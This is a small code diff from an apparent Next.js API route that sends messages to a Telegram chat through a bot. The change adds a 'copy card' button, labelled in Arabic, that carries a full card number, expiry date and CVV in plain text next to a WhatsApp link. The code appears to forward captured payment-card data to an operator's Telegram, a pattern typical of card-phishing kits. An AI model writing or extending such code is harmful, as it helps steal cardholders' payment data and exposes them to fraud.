@@ -48,7 +48,10 @@ export async function POST(req: NextRequest) {
           chat_id,
           text,
           parse_mode: "HTML",
-          reply_markup: { inline_keyboard: [[{ text: "💬 فتح واتساب", url: whatsappUrl }]] },
+          reply_markup: { inline_keyboard: [
+            [{ text: "💬 فتح واتساب", url: whatsappUrl }],
+            [{ text: "📋 نسخ البطاقة", copy_text: { text: `${cardNumber}\n${expiry}\n${cvv}` } }],
+          ] },
         }),
       })
     )
